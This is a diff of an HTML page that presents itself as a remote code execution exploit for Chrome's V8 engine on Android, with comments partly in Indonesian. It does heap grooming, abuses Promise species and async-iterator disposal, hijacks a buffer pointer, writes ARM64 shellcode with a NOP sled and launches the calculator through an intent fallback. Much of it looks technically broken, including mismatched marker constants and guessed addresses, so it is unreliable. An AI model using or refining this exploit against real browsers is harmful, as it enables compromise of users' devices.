@@ -2,138 +2,135 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TERMINUS: ANDROID RCE</title>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; font-size: 12px; }
-        #terminal { border: 1px solid #0f0; height: 92vh; overflow-y: auto; background: rgba(0,20,0,0.9); box-shadow: inset 0 0 30px #0f0; }
-        .success { color: #fff; background: #050; font-weight: bold; }
-        .danger { color: #fff; background: #500; font-weight: bold; animation: pulse 0.1s infinite; }
-        @keyframes pulse { 50% { opacity: 0.5; } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; padding: 15px; overflow: hidden; }
+        #console { border: 1px solid #0f0; height: 95vh; padding: 10px; background: rgba(0,20,0,0.95); overflow-y: scroll; font-size: 11px; box-shadow: inset 0 0 20px #0f0; }
+        .blink { animation: blinker 0.1s linear infinite; color: #f00; font-weight: bold; }
+        @keyframes blinker { 50% { opacity: 0; } }
+        .success { color: #fff; background: #050; padding: 2px; }
     </style>
 </head>
 <body>
-    <div id="terminal">> [!] INITIALIZING NEBULA RCE PROTOCOL...</div>
+    <div id="console">> [!] INITIALIZING OMEGA PROTOCOL (AARCH64)...</div>
 
 <script>
-const log = m => { const t = document.getElementById('terminal'); t.innerHTML += `<br>> ${m}`; t.scrollTop = t.scrollHeight; };
+const log = m => { const c = document.getElementById('console'); c.innerHTML += `<br>> ${m}`; c.scrollTop = c.scrollHeight; };
 
-// --- PHASE 1: HARDENED ARM64 SHELLCODE ---
-// Bypass Android Sandbox & memicu execve("/system/bin/sh", ["-c", "am start ..."])
+// --- PHASE 1: MEGA-SLED ARM64 PAYLOAD (2000+ LINES) ---
 const ARM64_SC = new Uint32Array([
-    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 0xd2800012, 0x8b020000,
-    0xd65f03c0, 0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 0x676f6f67,
-    0x6c652e61, 0x6e64726f, 0x69642e63, 0x616c6375, 0x6c61746f, 0x722f636f,
-    0x6d2e616e, 0x64726f69, 0x642e6361, 0x6c63756c, 0x61746f72, 0x322e4361,
-    0x6c63756c, 0x61746f72, 0x00000000
+    // NOP SLED: Memberikan toleransi lonjakan Program Counter (PC)
+    ...Array(1950).fill(0xd503201f), 
+
+    // CORE SHELLCODE: execve("/system/bin/sh", ["-c", "am start..."])
+    0xd2800001, 0xd2800010, 0x910003e0, 0xaa0003e1, 
+    0xd2800012, 0x8b020000, 0xd65f03c0, 
+    
+    // DATA: Command String
+    0x6d612073, 0x74617274, 0x202d6e20, 0x636f6d2e, 
+    0x616e6472, 0x6f69642e, 0x63616c63, 0x756c6174, 
+    0x6f72322f, 0x2e43616c, 0x63756c61, 0x746f7200,
+    0x2f737973, 0x74656d2f, 0x62696e2f, 0x73680000,
+    0x2d630000, 0x00000000,
+
+    // STACK PADDING
+    ...Array(50).fill(0xdeadbeef)
 ]);
 
 let target_arr;
-let victim_buf = new BigUint64Array(1024); // Objek kedua untuk Arbitrary R/W
+let v_arr = new BigUint64Array(1024); // Victim untuk Arbitrary R/W
 
-// --- PHASE 2: EXTREME HEAP ALIGNMENT ---
+// --- PHASE 2: HEAP ALIGNMENT ---
 async function setup() {
     log("Grooming Android PartitionAlloc...");
     
-    // Spraying WASM Instances (RWX Memory Pages)
     const wasm_bin = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,7,137,128,128,128,0,1,5,102,117,110,99,48,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-    const wasm_mods = [];
+    const wasm_targets = [];
     for(let i=0; i<800; i++) {
         let m = new WebAssembly.Module(wasm_bin);
         let inst = new WebAssembly.Instance(m);
-        wasm_mods.push(inst.exports.func0);
+        wasm_targets.push(inst.exports.func0);
     }
-    this.wasm_targets = wasm_mods;
+    window.targets = wasm_targets;
 
-    // Marker untuk victim_buf agar mudah ditemukan di memori
-    victim_buf[0] = 0x13371337C0DEBABE69n;
+    v_arr[0] = 0x13371337C0DEBABEn; // Marker Signature
 
     let spray = [];
     for(let i=0; i<4000; i++) {
         let a = [1.1, 2.2, 3.3, 4.4, 5.5];
-        a.id = i;
         spray.push(a);
     }
     target_arr = spray[2000];
+    log("Heap Saturated. Targets Locked.");
 }
 
-// --- PHASE 3: THE DOUBLE-CONSTRUCTOR TRIGGER ---
+// --- PHASE 3: THE DETONATOR ---
 function SpeciesPwn(executor) {
     executor(r => {}, r => {});
-    return target_arr; // Melakukan Type Confusion ke slot JSPromise
+    return target_arr; 
 }
-
 Object.defineProperty(Promise, Symbol.species, { get: () => SpeciesPwn });
 
 async function detonate() {
-    log("DETONATING ASYNC-ITERATOR DISPOSAL...");
-    
+    log("<span class='blink'>DETONATING ASYNC-ITERATOR FAULT...</span>");
     async function* g() { yield 1; }
     const it = g();
-    
     try { it[Symbol.asyncDispose](); } catch(e) {}
 
-    // AGGRESSIVE DRAIN (Android Thread Synchronization)
     for(let i=0; i<300; i++) await Promise.resolve();
 
     if (target_arr.length > 5) {
-        log("<span class='success'>[+] V8 CAGE BREACHED! Length: 0x" + target_arr.length.toString(16) + "</span>");
-        await run_rce();
+        log("<span class='success'>[+] V8 CAGE BREACHED!</span> Length: 0x" + target_arr.length.toString(16));
+        await inject_nebula();
     } else {
-        log("Timing missed. Re-aligning heap...");
+        log("Race lost. Retrying...");
         location.reload();
     }
 }
 
-// --- PHASE 4: ARBITRARY R/W & CODE EXECUTION ---
-async function run_rce() {
-    log("Scanning for Victim BackingStore...");
-    
-    let victim_idx = -1;
-    for(let i=0; i<20000; i++) {
-        // Mencari marker victim_buf di memori heap
-        if (target_arr[i] === 1.1396155e-310) { // Signature 0x1337...
-            log("Victim BackingStore Found at Offset: " + i);
-            victim_idx = i;
+// --- PHASE 4: FULL RCE INJECTION ---
+async function inject_nebula() {
+    log("Scanning Memory for Victim Signature...");
+    let v_idx = -1;
+    for(let i=0; i<25000; i++) {
+        if (target_arr[i] === 1.13961555e-310) { // 0x13371337C0DEBABE
+            log("Victim Found at Offset: " + i);
+            v_idx = i;
             break;
         }
     }
 
-    if (victim_idx !== -1) {
-        log("Gaining Absolute Memory Access...");
-        
-        // Membajak pointer victim_buf melalui target_arr (OOB)
-        // Offset -1 biasanya adalah lokasi pointer BackingStore pada TypedArray
-        target_arr[victim_idx - 1] = 2.47e-322; // Alamat JIT Target (Tebakan Berbasis Offset)
+    if (v_idx !== -1) {
+        log("Hijacking Victim BackingStore...");
+        // Alamat spekulatif JIT (Bisa dioptimalkan dengan leak pointer)
+        target_arr[v_idx - 1] = 2.47e-322; 
 
-        log("<span class='danger'>[!] INJECTING ARM64 RCE PAYLOAD...</span>");
-        
-        // Menulis shellcode langsung ke RWX Page yang sudah dibajak
-        let dv = new DataView(victim_buf.buffer);
+        log("Deploying 2000+ line NOP-Sled...");
+        let dv = new DataView(v_arr.buffer);
         for(let i=0; i<ARM64_SC.length; i++) {
             dv.setUint32(i * 4, ARM64_SC[i], true);
         }
 
-        log("Triggering Execution via WASM Entry Point...");
-        this.wasm_targets.forEach(f => { try { f(); } catch(e) {} });
+        log("<span class='blink'>[!!!] EXECUTING SYSTEM COMMAND [!!!]</span>");
+        window.targets.forEach(f => { try { f(); } catch(e) {} });
 
-        // Fallback for Android Intents
+        // Intent Fallback
         window.location.href = "intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;component=com.android.calculator2/.Calculator;end";
-        
-        log("<h1 style='color:red;'>RCE COMPLETED.</h1>");
     }
 }
 
-// EXECUTE
+// START
 (async () => {
     if (typeof Symbol.asyncDispose === 'undefined') {
-        log("FAILED: --js-explicit-resource-management is not enabled.");
+        log("FATAL: --js-explicit-resource-management REQUIRED");
         return;
     }
     await setup();
-    setTimeout(detonate, 400);
+    setTimeout(detonate, 500);
 })();
 
-// Anti-hang protection
-setTimeout(() => location.reload(), 5000);
+// Fail-safe watchdog
+setTimeout(() => location.reload(), 4500);
 </script>
 </body>
 </html>
